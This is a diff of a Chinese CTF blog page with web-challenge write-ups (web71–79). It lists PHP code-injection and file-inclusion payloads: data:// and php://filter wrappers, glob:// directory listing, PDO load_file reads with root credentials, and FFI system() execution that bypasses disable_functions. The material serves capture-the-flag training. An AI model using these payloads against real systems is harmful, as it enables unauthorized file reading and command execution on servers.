@@ -928,9 +928,39 @@ if(isset($_POST[&#39;c&#39;])){
 
 你要上天吗？</code></pre><p>将输出的字母和数字都替换成了? ，可以用exit();终止脚本的执行，从而让替换代码失效。</p>
 <pre><code>c=include(&quot;/flag.txt&quot;);exit();
-c=require(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
-<p>index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCJubCAqIik/Pg==</p>
+c=require(&quot;/flag.txt&quot;);exit();</code></pre><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>这题太难了，俺啥也不会，直接上大佬的博客</p>
+<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930" target="_blank" rel="noopener">https://blog.csdn.net/miuzzx/article/details/108619930</a></p>
+<p><a href="https://blog.csdn.net/qq_46091464/article/details/108891975" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/108891975</a></p>
+<p>只说我遇到的问题</p>
+<p>读文件的poc，羽师傅用的是</p>
+<pre><code>$a=opendir(&quot;glob:///*&quot;); while (($file = readdir($a)) !== false){echo $file . &quot;&lt;br&gt;&quot;; };exit(); </code></pre><p>可以直接用</p>
+<p>Firebasky大佬的poc</p>
+<pre><code>c=?&gt;&lt;?php
+    $a=new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($a as $f)
+{echo($f-&gt;__toString().&#39; &#39;);
+}
+exit(0);
+?&gt;</code></pre><p>因为中间用了换行，所以我用hackbar直接复制粘贴不行，要去掉换行</p>
+<p>然后uaf的脚本中的特殊字符需要进行url编码(bp里有这个功能)</p>
+<h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>上边的两个列目录的poc还能用</p>
+<p>有flagc.txt，然后读文件还是之前的poc</p>
+<pre><code>c=include(&quot;/flagc.txt&quot;);exit();
+c=require(&quot;/flagc.txt&quot;);exit();</code></pre><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>同web73，flagc.txt变成了flagx.txt</p>
+<h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>列目录的poc还能用，flag36.txt</p>
+<p>读文件用mysql load_file</p>
+<pre><code>c=try {
+  $dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;, &#39;root&#39;);
+  foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) {   //flag36d.txt
+      echo($row[0]).&quot;|&quot;;
+  }
+  $dbh = null;
+} catch (PDOException $e) {
+  echo $e-&gt;getMessage();
+  die();
+}exit();</code></pre><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>同web75   flag36d.txt</p>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>flag36x.txt</p>
+<pre><code>c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt; flag.txt&quot;);exit();</code></pre><p>参考资料：<a href="https://mp.weixin.qq.com/s?src=11&timestamp=1610635976&ver=2828&signature=rnqX1*PBHoiQcReB6WvyZjOY4pKb1UuZ5zIimS2He*OSZM0dMmr84zSD2luvQEa0-I*P5T0W8wxiYCcx3KzeFIzUFVPSoK2oEOhNzNwT78MuONSEw2pZNYrgUFVygVZe" target="_blank" rel="noopener">利用PHP中的FFI扩展执行命令</a></p>
 
         </div>
         <!-- .entry-content -->
